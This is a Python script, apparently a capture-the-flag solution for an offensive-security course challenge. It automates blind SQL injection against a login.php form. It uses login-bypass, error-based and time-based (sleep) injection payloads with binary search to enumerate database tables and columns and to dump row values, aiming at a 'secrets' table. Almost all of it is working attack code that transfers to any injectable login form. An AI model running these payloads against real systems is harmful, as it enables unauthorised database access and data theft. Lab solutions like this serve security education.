#import from py
import re

#outside imports
import requests
from pwn import *

host = 'offsec-chalbroker.osiris.cyber.nyu.edu'
port = 1241
netid='pk1898'

#used for pulling the flag from output
flag_regex = r"flag\{[^}]+\}"
global_timeout = 5 #seconds
requests_proxies = {}
#requests_proxies['http'] = 'http://192.168.149.1:8080'

#universal flag finder, given a string
def find_flag(input):
    m = re.findall(flag_regex, input)
    if(m != []):
        return m[0]
    else:
        return None


def make_request(sqli_data, timeout=global_timeout):
    url = 'http://%s:%d/login.php' % (host, port)
    cookies = {'CHALBROKER_USER_ID':netid}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    r = requests.post(  url, allow_redirects=False, cookies=cookies, proxies=requests_proxies, headers=headers,
                        data = {'email': sqli_data, 'password': 'doesntmatter'})
    return r


# Using login bypass as an oracle
def sqli_login(sql):
    injection = "' OR 1 AND %s -- " % sql
    print 'Injection: %s' % injection
    r = make_request(injection)
    if('no such user' not in r.content.lower()):
        return True
    else:
        return False


# Using 500 webserver response as the oracle
def sqli_fatal_error(sql):
    injection = "' AND (select if(%s,1,(select table_name from information_schema.tables))) -- " % sql
    print 'Injection: %s' % injection
    r = make_request(injection)
    if('fatal error' not in r.content.lower()):
        return True
    else:
        return False


# Using timing as an oracle
def sqli_time(sql):
    injection = "' OR (select if(%s,sleep(2),1)) -- " % sql
    print 'Injection: %s' % injection
    start = time.time()
    r = make_request(injection)
    end = time.time()
    if(end - start > 2):
        return True
    else:
        return False


perform_sqli_func = sqli_time

def guess_num_rows(query):
    for i in range(1,100):
        sqli_data = "(select count(1) = %d from %s)" % (i, query)
        if perform_sqli_func(sqli_data):
            return i
    print "Couldn't figure out number of rows!"
    return None



# Test if character at index i is < val
def test_field_string_char(table, column, row, i, val):
    cond = "(select ascii(substr(%s, %d, 1)) < %d from %s limit 1 offset %d)" % (column, i+1, val, table, row)
    return perform_sqli_func(cond)

#binary search to speed things up
def guess_field_string_char(table, column, row, i):
    low, high = 0, 256
    while True:
        mid = low + ((high - low) / 2)
        if test_field_string_char(table, column, row, i, mid):
            high = mid
        else:
            low = mid
        if low+1 == high:
            return low

def guess_field_string_length(table, column, row):
    for i in range(1,100):
        cond = "(select length(%s) = %d from %s limit 1 offset %d)" % (column, i, table, row)
        if perform_sqli_func(cond):
            return i
    print "Couldn't figure out string length!"
    return None

def guess_field_string_value(table, column, row):
    length = guess_field_string_length(table, column, row)
    name = ''
    for i in range(length):
        name += chr(guess_field_string_char(table, column, row, i))
    return name




def enumerate_tables():
    #get the table count
    number_of_tables = guess_num_rows('information_schema.tables')
    if(number_of_tables == None):
        print 'Couldnt figure out number of rows ; returning'
        return None
    print 'Table Count: %d' % number_of_tables

    #get the table names
    tables = []
    #reverse them since the db software sets up its own tables first, before user ones
    for x in reversed(range(0,number_of_tables)):
        name = guess_field_string_value('information_schema.tables', 'table_name', x)
        print name
        tables.append(name)
    print tables
    return tables



def dump_data(table):
    column_count = guess_num_rows('information_schema.columns where table_name=\'%s\'' % table)
    if(column_count == None):
        print 'Error enumerating columns for Table: %s' %  table
        return None

    columns = []
    for i in range(column_count):
        column = guess_field_string_value('information_schema.columns where table_name=\'%s\'' % table, 'column_name', i)
        if(column == None):
            print 'Error retrieving columns ; returning'
            return None
        print 'Column Retrieved: %s' % column
        columns.append(column)

    row_count = guess_num_rows(table)
    if(row_count == None):
        print 'Error getting row count'
        return None
    print 'Rows: %d' % row_count

    for column in columns:
        for x in range(row_count):
            value = guess_field_string_value(table, column, x)
            print 'Column: %s; Row: %d; Value: %s' % (column, x, value)
            if(find_flag(value)):
                return find_flag(value)


def solve():
    """
    #this is really slow
    tables = enumerate_tables()
    if(tables == None):
        print 'No tables enumerated'
        return False
    """

    #the table we're interested in
    tables = ['secrets']
    for table in tables:
        return dump_data(table)
    return None



#scaffolding
def main():
    flag = solve()
    print flag
    if(flag):
        print "Challenge Solved: %s" % flag
    else:
        print "Challenge Not Solved"

if __name__ == '__main__':
    main()